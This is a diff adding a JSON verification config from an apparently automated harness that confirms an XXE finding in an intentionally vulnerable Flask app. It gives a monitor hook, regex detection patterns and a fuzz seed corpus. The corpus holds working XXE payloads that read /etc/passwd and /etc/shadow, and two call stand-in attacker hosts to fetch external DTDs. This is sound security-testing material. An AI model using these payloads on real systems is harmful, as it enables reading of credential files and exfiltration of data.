@@ -1,0 +1,49 @@
+{
+  "monitor": {
+    "strategy": "recorded_call",
+    "patch_target": "app.etree.fromstring",
+    "target_arg_index": 0,
+    "target_arg_name": "text",
+    "capture_what": "raw XML string passed to etree.fromstring from request.form['xml']",
+    "additional_imports": []
+  },
+  "oracle_check": {
+    "condition_description": "The captured XML string contains a DOCTYPE declaration with an external ENTITY definition (SYSTEM or PUBLIC), confirming an XXE payload reached the unsafe parser",
+    "trigger_patterns": [
+      "<!DOCTYPE\\s+\\S+[^>]*<!ENTITY\\s+\\S+\\s+SYSTEM",
+      "<!DOCTYPE\\s+\\S+[^>]*<!ENTITY\\s+\\S+\\s+PUBLIC",
+      "<!ENTITY\\s+%\\s+\\S+\\s+SYSTEM"
+    ],
+    "raise_type": "RuntimeError",
+    "raise_message_template": "PY_XXE: external entity injection in XML payload — captured={captured} pattern={matched_pattern}"
+  },
+  "fuzz_guidance": {
+    "seed_corpus": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"http://attacker.com/xxe\">]><data>&file;</data>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]><root>test</root>",
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC \"foo\" \"file:///etc/shadow\">]><root>&xxe;</root>"
+    ],
+    "skip_condition": "False"
+  },
+  "_meta": {
+    "function": "xml",
+    "file": "app.py",
+    "input_strategy": "flask_view",
+    "function_signature": "def xml()",
+    "tainted_params": [
+      {
+        "name": "xml",
+        "index": -1,
+        "type": "str"
+      }
+    ],
+    "target_id": "py_xxe_app_py_159",
+    "finding_id": "3",
+    "rule_id": "py/xxe",
+    "rule_slug": "py_xxe",
+    "model": "openai/glm-5-turbo",
+    "source_finding_artifact": "output/python/realvuln-damn-vulnerable-flask-application/verification_results/findings/finding_3_py_xxe.json"
+  }
+}
